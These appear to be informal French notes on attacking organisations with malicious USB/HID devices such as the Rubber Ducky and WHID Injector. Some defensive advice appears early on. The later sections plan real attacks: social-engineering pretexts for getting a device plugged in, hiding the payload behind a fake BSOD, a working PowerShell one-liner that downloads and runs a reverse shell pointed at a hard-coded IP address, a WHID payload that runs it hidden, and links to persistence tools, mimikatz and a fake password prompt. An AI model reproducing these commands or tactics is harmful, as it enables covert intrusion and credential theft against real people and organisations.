# USB

## Cas généraux


https://lh5.googleusercontent.com/TuqtjTyQTnIXopkHs4WjBBB_56LLX3mB0FHUs7Gm_RrhKYX3NsH2xoi0xVDbnZFZS26TSTC6in9wi_kLyOYKbFpFLLbVtgRK0CmDFR0Wum3T9LPlTxyqvOhmJdLRl3UzC0L3xej5


    Sabotage industriel, 

    Ransomware, 

    Vol de propriété intellectuelle,

    Destruction de données.

----------------------
 

Les attaquants qui vont cibler une entreprise vont passer par une étape de reco et do'sint pour savoir quelles personnnes peuvent être vulnérables en raisons de pressions financières, de mécontentement ou de SE. Ex : par les réseaux sociaux FB, twitter, un peu moins linkedin quoique. L'attaquant tire profit de ces infos et peut alors etablir une relation avec l'individu x, affinez les recherches en regardant le role dans l'entreezprise, les competence technique

tout le monde ne tombe pas dans le panneau, exemple un employé de tesla qui a refusé 1M pour installer un malware pour l'atttaquant (fowler)

Comment se protéger ?

- Garantissez d’abord la sécurité physique pour que le personnel non autorisé ne puisse pas connecter n’importe quel dispositif USB aux systèmes de contrôles industriels. Bloquez physiquement les ports USB que ces systèmes n’utilisent pas, et empêcher le retrait des HID déjà connectés.

- Formez vos employés pour qu’ils connaissent les différents genres de menaces, y compris les dispositifs USB infectés, et ainsi éviter certains incidents comme celui de La La Land.
Segmentez correctement le réseau, et gérez les droits d’accès pour empêcher les pirates informatiques d’atteindre les systèmes utilisés pour contrôler les infrastructures critiques. 
    
    
-------------------------

La troisième génération des outils USB qui permettent de réaliser des tests d’intrusion a atteint un tout autre niveau. L’outil WHID Injector est l’un d’entre eux, et il s’agit tout simplement de Rubberducky avec une connexion Wi-Fi. Comme il est connecté en Wi-Fi, il n’y a pas besoin de programmer en amont toutes les actions qu’il est censé effectuer. Un pirate informatique peut contrôler l’outil à distance, ce qui apporte une certaine flexibilité, et lui permet de travailler avec différents systèmes d’exploitation

--------------------------

Article ultra interessant et utile https://elie.net/static/images/images/what-are-malicious-usb-keys-and-how-to-create-a-realistic-one/USB_HID_spoofing_attack_illustrated.960.png


https://elie.net/blog/security/what-are-malicious-usb-keys-and-how-to-create-a-realistic-one/



----------------------

Pour planquer dans des objets les usb https://raw.githubusercontent.com/certsocietegenerale/Publications/master/DFRWS%20EU19%20-%20The%20Rise%20Of%20HID%20Devices.pdf


---------------------------


Ensuite, les attaquants ont besoin d’un moyen pour que leur clé USB ou leur périphérique avec port USB soit branché sur l’appareil ciblé. Ils peuvent soit le faire eux-même, soit utiliser l’ingénierie sociale pour que quelqu’un d’autre le fasse, sans que cette personne ne s’en rende compte. Les clés USB peuvent être déposées dans la rue, au bureau, dans une boîte aux lettres ou données en cadeau lors d’événements, comme cela s’est peut-être produit lors du sommet du G20 de 2013. 

------------------------------------

atteindre des reseaux solo ou qui sont cache 

cible atteignable physiquement direct ou indirect

reverse shell puis mimikatz

pas lancer le payload tout seul, distraire avec des doc confidentiel ou du porno

https://youtu.be/9xBs0cG0hjY?t=1043 partie whid

scenario : qqun branche la clé et il suffit d'attendre et charge declencher depuis le tel

si pas de visu, jumelle telescope ou drone

a 24minute il parle de comment venir brancher


personne, pas ferme a clé ,on branche

une autre excuse pour rentrer https://youtu.be/9xBs0cG0hjY?t=1805

clé usb cadeau, d'une entreprise amie, autocllant par exemple

 trousseau de clé par terre avec le usb dedans



----------------

 acces a des endroit important sans passer par le reseau, donc difficile pour le forensic

la pensée secu physique est souvent oublié, alors que les acteurs nefaste peuvent venir par la facilement pour atteindre une orga
des fois des attaques trop sophistique pour au final pas realiste

pas besoin d'avoir de perm, c'est juste un clavier


https://youtu.be/HTrQHZtNyBw?t=1943 il cache son  texte powershell

ouvre un reverse et apres va en arriere plan faire le reste


souvent dans les boite c'est l'executif, le boss qui vont pas se faire chier sur la secu car il dev pas ou autre et ils auront sur leur pc des choses sympa meme si ils sont pas dans les dmz serv ou dev etc

en terme de blue team c'est leger encore sur la défense


--------------------------

tape rapidement plus que nous sans erreyr
marche meme si un u3 autorun est off

si la personne tourne sa tete pdt une minute un pentester peut le plug
on peut aussi le faire avec un timer 
just imaginer comment l'utiliser

on peut l'utiliser pour dump des mdp plus tard ou des fihchier qu'on s'envoie par mail
on peut mettre un programme sur la clé pour run ou des cookies gardé qu'on peut recup pour se log

on peut cacher l'usb dans un hub usb, ou dans une souris qui change de couleur par exemple

on peut le laisser et attendre que des gens le plug ou alors en cadeau

on peut faire un programme qui fait un fake BSOD et pendant ce temps execute les attaque
prendre tout les fichier sur le bureau

---------

On estime que 9 ingénieurs de maintenance sur 10 utilisent encore le bus série universel (USB) pour se connecter aux machines des usines ciblées*. Malgré l'avènement d'Internet et les innovations telles que le cloud et même le SD-WAN, pourquoi le personnel compte-t-il encore autant sur les supports amovibles et le matériel externe, comme les clés USB ?

Les entreprises industrielles ont toujours besoin de clés USB pour plusieurs raisons : - Tous les sites/usines ne sont pas connectés - l'USB peut être le seul moyen d'obtenir des mises à jour de certains fournisseurs - Facilité d'utilisation. Les gens gravitent vers la voie de la moindre résistance, et du succès le plus rapide - L'interdiction des USB en tant que politique s'est avérée inefficace.

bien plus facile d'exploiter des comportement humain à risque dans une boite plutot que deface des pare feu et systeme de securité à l'extérieur, sans eveiller de soupcon

les gens oublient le danger potentiel catastrophique des usb ( et en plus elles sont tres pratique a transporter et utiliser)

il n'y a pas que les clé usb, on peut ataquer par un chargeur usb, un hub usb, un chargeur de CE, un ventilateur, bref tout ce qui a un cable usb

bonne pratique pour limiter les risques https://i.gyazo.com/9616bb95e68c6fbc418b6e07fb7641ca.png

https://gyazo.com/0699064237eba341af9c8c95c4ba30ae

https://gyazo.com/9f805940a30e07d8bba73ff42863571e

en détail https://esdacademy.blogspot.com/2020/10/les-stations-blanches-un-sas-pour.html?m=1

------------------------

## WHID

reverse shell https://github.com/cym13/vbs-reverse-shell
https://github.com/gnxbr/Fully-Undetectable-Techniques/tree/main/user-imitation

https://github.com/gnxbr/Fully-Undetectable-Techniques/tree/main/possessor


quand on branche la premiere fois on aura un quick setup

il y aura un nouveau réseau wifi

panel en 192.168.1.1

3mb de storage 

https://github.com/swisskyrepo/WHID_Toolkit

ESPloit uses its own scripting language and not Ducky Script,
although a Ducky Script to ESPloit converter is available at: https://exploitagency.github.io/Duckuino/index.html

to read af https://github.com/whid-injector/WHID/tree/master/ESPloitV2_whid

https://swisskyrepo.github.io/WhidInjector/





# Reverse shell

(from https://github.com/antonioCoco/ConPtyShell)

serveur : 

stty raw -echo; (stty size; cat) | nc -lvnp 3001

victime : 

IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 207.180.201.151 3001

on peut ensuite scp des fichiers que l'on veut vers notre vps


rendre ce reverse shell persistent et caché

Press:131+114
PrintLine:powershell -w 1 -nop -noni -c "powershell -w 1 -nop -noni -c "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 207.180.201.151 3001"

-----------------------------------------------


rendre persistent

https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload-Netcat-Reverse-Shell

https://github.com/0xthirteen/SharpStay

https://github.com/fireeye/SharPersist
------------------------------------


 à partir de la reverse pour sortir des infos

 ou ransomware

mimikatz

interessant comme technique https://youtu.be/q0GHAEEPVLk

--------------


voir ce qu'on peut faire d'interessant

https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads

pour convert https://exploitagency.github.io/Duckuino/index.html



------

un prompt pour pouvoir avoir les mdp

https://github.com/shantanu561993/SharpLoginPrompt